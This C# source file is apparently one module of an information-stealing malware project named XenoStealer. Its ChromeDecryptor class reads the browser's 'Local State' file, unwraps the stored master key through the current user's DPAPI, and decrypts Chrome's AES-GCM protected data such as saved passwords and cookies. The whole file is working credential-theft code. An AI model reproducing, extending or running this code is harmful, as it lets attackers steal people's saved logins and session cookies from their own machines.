using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace XenoStealer
{
    public class ChromeDecryptor
    {
        private byte[] masterKey;

        public bool operational = false;

        public ChromeDecryptor(string UserDataPath) 
        {
            if (!UserDataPath.EndsWith("Local State")) 
            {
                UserDataPath = Path.Combine(UserDataPath, "Local State");
            }
            masterKey = GetMasterKey(UserDataPath);
            operational= masterKey!=null;
        }

        private static byte[] GetMasterKey(string path)
        {
            if (!File.Exists(path))
                return null;

            string content = Utils.ForceReadFileString(path);
            if (content == null) 
            { 
                return null;
            }

            if (!content.Contains("os_crypt"))
                return null;

            JavaScriptSerializer serializer = new JavaScriptSerializer();
            try
            {
                dynamic jsonObject = serializer.Deserialize<dynamic>(content);
                if (jsonObject != null && jsonObject.ContainsKey("os_crypt") && jsonObject["os_crypt"].ContainsKey("encrypted_key"))
                {
                    string encryptedKeyBase64 = jsonObject["os_crypt"]["encrypted_key"];
                    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                    byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 5, encryptedKey.Length - 5));

                    return ProtectedData.Unprotect(masterKey, null, DataProtectionScope.CurrentUser);
                }
            }
            catch 
            { 
                
            }
            return null;
        }

        public string DecryptBase64(string buffer) 
        {
            try
            {
                return Decrypt(Convert.FromBase64String(buffer));
            }
            catch 
            {
                return null;
            }
        }

        public string Decrypt(byte[] buffer)
        {
            try
            {
                byte[] iv = new byte[12];
                Array.Copy(buffer, 3, iv, 0, 12);

                // Determine the lengths of buffer and tag
                int bufferLength = buffer.Length - 15;
                byte[] Buffer = new byte[bufferLength];
                Array.Copy(buffer, 15, Buffer, 0, bufferLength);

                // Extract the tag and data from Buffer
                int tagLength = 16;
                byte[] tag = new byte[tagLength];
                byte[] data = new byte[bufferLength - tagLength];
                Array.Copy(Buffer, bufferLength - tagLength, tag, 0, tagLength);
                Array.Copy(Buffer, 0, data, 0, bufferLength - tagLength);

                // Decrypt the data and return the result
                string result = Encoding.UTF8.GetString(AesGcm.Decrypt(masterKey, iv, null, data, tag));
                return result;
            }
            catch
            {
                return null;
            }
        }

    }
}
